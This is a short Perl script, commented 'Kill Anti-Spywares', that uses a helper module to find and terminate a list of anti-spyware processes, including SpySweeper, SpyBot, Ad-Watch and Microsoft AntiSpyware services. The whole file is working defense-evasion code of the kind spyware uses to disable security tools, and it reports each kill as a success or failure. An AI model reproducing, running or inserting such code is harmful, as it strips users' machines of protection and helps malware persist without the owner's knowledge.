#!perl.exe -w 

require "samtools.pm";


#Kill Anti-Spywares
kill_process('gcasServ');
kill_process('gcasDtServ');
kill_process('SpySweeper');
kill_process('SpyBot');
kill_process('Ad-Watch');
kill_process('Rau_Proxy.exe');

sub kill_process {
    my $process = shift;
    my $result = 0;

    my $pid = SamTools::Process::getpid($process);

    if ($pid){
        if (SamTools::Process::kill_pid($pid)){
            print("Process=Successfully killed $process\n");
        }
        else{
            print("Process=Cannot kill $process\n");
        }
    }
    else{
	    print("Process=$process not found\n");
    }
}

